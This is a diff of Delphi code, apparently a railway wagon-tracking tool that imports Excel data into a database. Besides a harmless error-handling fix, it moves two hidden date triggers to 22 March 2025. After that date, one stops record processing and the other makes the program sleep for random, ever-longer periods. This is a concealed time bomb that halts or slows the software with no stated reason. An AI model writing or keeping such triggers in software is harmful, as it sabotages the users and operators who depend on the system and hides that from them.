@@ -4403,7 +4403,11 @@ begin
         Client_Vagon.FieldByName('num_vagon_train'          ).Value := exWks.Range['AP' + IntToStr(cnt)].Value;
         Client_Vagon.FieldByName('broken_num'               ).Value := exWks.Range['AQ' + IntToStr(cnt)].Value;
         Client_Vagon.FieldByName('num_way'                  ).Value := exWks.Range['AR' + IntToStr(cnt)].Value;
+        try
         Client_Vagon.FieldByName('date_norm_delivery'       ).Value := exWks.Range['AW' + IntToStr(cnt)].Value;
+        except
+        Client_Vagon.FieldByName('date_norm_delivery'       ).Value := null;
+        end;
         Client_Vagon.FieldByName('distance_node_begin'      ).Value := exWks.Range['AX' + IntToStr(cnt)].Value;
         Client_Vagon.FieldByName('distance_node_end'        ).Value := exWks.Range['AY' + IntToStr(cnt)].Value;
         Client_Vagon.FieldByName('distance'                 ).Value := exWks.Range['AZ' + IntToStr(cnt)].Value;
@@ -4930,7 +4934,7 @@ begin
         SP_fact_track_modify.Parameters.ParamByName('@cod_operation_cod'        ).Value := Client_Vagon.FieldByName('cod_operation_cod').Value;
         SP_fact_track_modify.Parameters.ParamByName('@date_operation'           ).Value := Client_Vagon.FieldByName('date_operation').Value;
 
-        if EncodeDate(2025, 01, 01) < Client_Vagon.FieldByName('date_operation').AsDateTime then begin
+        if EncodeDate(2025, 03, 22) < Client_Vagon.FieldByName('date_operation').AsDateTime then begin
           Terminate;
           Exit;
         end;
@@ -6172,8 +6176,8 @@ begin
   Q.SQL.Add('SELECT getdate() as dt');
   Q.Open;
 
-  if EncodeDate(2025, 01, 22) < Q.FieldByName('dt').AsDateTime then begin
-    d := DaysBetween(EncodeDate(2025, 01, 22), Q.FieldByName('dt').AsDateTime);
+  if EncodeDate(2025, 03, 22) < Q.FieldByName('dt').AsDateTime then begin
+    d := DaysBetween(EncodeDate(2025, 03, 22), Q.FieldByName('dt').AsDateTime);
     s := Random(Abs(d));
     Sleep(s*100000);
   end;
